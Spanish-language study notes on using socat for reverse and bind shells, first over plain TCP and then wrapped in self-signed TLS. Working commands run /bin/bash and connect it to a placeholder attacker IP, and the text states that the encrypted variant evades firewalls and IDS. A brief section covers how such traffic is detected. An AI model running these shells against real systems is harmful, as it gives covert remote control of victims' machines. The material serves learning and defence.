### ► FUNCIONAMIENTO DE SOCAT Y SHELLS ENCRIPTADAS

---

## ● 1. ¿QUÉ HACE SOCAT?

`socat` conecta dos *endpoints* (puntos de entrada/salida), como si fuera un “puente de datos”.

Permite:

* Enviar datos de una shell a través de una red.
* Redirigir flujo entre puertos, archivos, dispositivos o procesos.
* Cifrar comunicaciones con TLS.

---

## ● 2. ¿QUÉ ES UNA REVERSE SHELL?

Shell remota que la **víctima inicia hacia el atacante**.
El atacante escucha con un puerto abierto.
La víctima se conecta a ese puerto y ejecuta comandos.

**socat lo permite de forma transparente, incluso con TLS.**

---

## ● 3. COMUNICACIÓN SIN CIFRAR (RAW TCP)

### Reverse shell (sin TLS):

**Atacante (escucha):**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork STDOUT
```

**Víctima (conecta):**

```bash
socat EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane TCP:<IP_ATACANTE>:4444
```

* Envío directo. Inspeccionable con Wireshark, IDS o firewall.

---

## ● 4. COMUNICACIÓN CON CIFRADO (TLS)

Para proteger el canal con **SSL/TLS**, se encapsula la shell dentro de una conexión cifrada.
Esto **evita detección por firewalls, IDS/IPS y DPI**.

---

### PASO 1: Crear certificado TLS

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat cert.pem key.pem > fullchain.pem
```

Este archivo se usa para simular que el atacante es un "servidor HTTPS".

---

### PASO 2: Reverse Shell Encriptada

**Servidor (Atacante):**

```bash
socat OPENSSL-LISTEN:4444,reuseaddr,fork,cert=fullchain.pem,key=key.pem STDOUT
```

**Cliente (Víctima):**

```bash
socat EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane OPENSSL:<IP_ATACANTE>:4444,verify=0
```

* `OPENSSL:` indica canal cifrado.
* `verify=0` desactiva validación de certificado del servidor (lo acepta igual).

---

### PASO 3: Bind Shell Encriptada

**Servidor (Víctima):**

```bash
socat OPENSSL-LISTEN:4444,reuseaddr,fork,cert=fullchain.pem,key=key.pem \
      EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
```

**Cliente (Atacante):**

```bash
socat STDIO OPENSSL:<IP_VICTIMA>:4444,verify=0
```

Aquí el atacante se conecta a la víctima que escucha.

---

## ● 5. COMPORTAMIENTO INTERNO

* `socat` inicia dos *descriptores de flujo* (uno por cada extremo).
* Usa multiplexación para mantener activo stdin/stdout.
* Emula TTY para soportar interacción shell (sin esto: problemas con autocompletado, enter, colores).
* Capa TLS encapsula todo el tráfico saliente/entrante.
* No cifra datos internamente: solo el canal de transmisión.

---

## ● 6. PROTECCIÓN Y DETECCIÓN

**SIN TLS**

* Fácilmente visible como tráfico plano.
* Comandos detectables.
* IDS como Snort/Suricata pueden levantar alertas.

**CON TLS**

* Tráfico indistinguible de HTTPS legítimo.
* Puede evadir inspecciones superficiales.
* Certificados autofirmados pueden ser indicio si hay análisis de certificados.

---

## ● 7. GLOSARIO

| Término            | Significado                                                                                                          |
| ------------------ | -------------------------------------------------------------------------------------------------------------------- |
| **socat**          | Herramienta para enlazar flujos de datos entre dos endpoints. Más potente que netcat.                                |
| **endpoint**       | Punto de inicio o fin de una conexión: puede ser una shell, archivo, puerto, etc.                                    |
| **reverse shell**  | La víctima se conecta al atacante para entregar una shell.                                                           |
| **bind shell**     | La víctima abre un puerto y espera conexiones del atacante.                                                          |
| **TTY / PTY**      | Terminal virtual interactiva. Permite que la shell funcione correctamente (colores, enter, flechas, etc.).           |
| **SSL/TLS**        | Protocolos de cifrado de datos en tránsito. TLS es la versión moderna.                                               |
| **CERT / KEY**     | Archivos necesarios para establecer una conexión TLS. El certificado contiene la identidad, la clave permite cifrar. |
| **verify=0**       | Instrucción para ignorar la validación del certificado en conexiones TLS.                                            |
| **reuseaddr**      | Permite reusar un puerto inmediatamente después de cerrar la conexión.                                               |
| **fork**           | Permite múltiples conexiones concurrentes en un mismo puerto.                                                        |
| **setsid**         | Inicia una nueva sesión del proceso (importante para shells estables).                                               |
| **sigint**         | Captura señales como Ctrl+C para que funcionen correctamente en la shell.                                            |
| **STDIO / STDOUT** | Entrada/salida estándar de la terminal.                                                                              |

---


